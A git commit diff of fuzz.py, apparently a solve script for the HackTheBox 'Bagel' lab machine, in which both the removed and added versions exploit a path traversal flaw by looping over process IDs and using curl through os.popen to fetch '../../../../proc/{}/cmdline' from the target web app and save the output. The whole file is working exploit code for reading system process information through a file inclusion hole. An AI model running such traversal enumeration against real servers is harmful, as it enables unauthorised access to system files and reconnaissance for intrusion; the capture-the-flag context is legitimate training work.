f7de9c5cac82676c5b4f5baff0bcd7bfbbbe8aa5
Mark Uche <113513376+markuched13@users.noreply.github.com>
2023-02-19 02:55:07 +0100

    Update fuzz.py

--- solvescript/htb/b2b/bagel/fuzz.py
+++ solvescript/htb/b2b/bagel/fuzz.py
@@ -1,13 +1,23 @@
 import os
 
-targeturl = "http://bagel.htb:8000/?page=../../../../../../proc/{}/cmdline"
+# Define the path to the file containing the process numbers
+process_file = "process.txt"
 
-previous_output = ""
-for i in range(1, 2000):
-    cmdline_path = f"/proc/{i}/cmdline"
-    if os.path.exists(cmdline_path):
-        url = targeturl.format(i)
-        output = os.popen(f"curl -s {url}").read()
-        if 'File' not in output and output != previous_output:
-            print(output)
-            previous_output = output
+# Define the base URL to send the curl requests to
+base_url = "http://bagel.htb:8000/?page=../../../../../../proc/{}/cmdline"
+
+# Open the output file
+with open("output.txt", "w") as output_file:
+
+    # Read the contents of the process file
+    with open(process_file, "r") as f:
+        process_numbers = f.read().splitlines()
+
+    # Loop through each process number and send a curl request
+    for number in process_numbers:
+        # Build the URL for this process number
+        url = base_url.format(number)
+        # Send the curl request and write the output to the output file
+        curl_output = os.popen(f"curl {url}").read()
+        output_file.write(curl_output + number)
+        output_file.write("\n")  # Add a blank line between requests
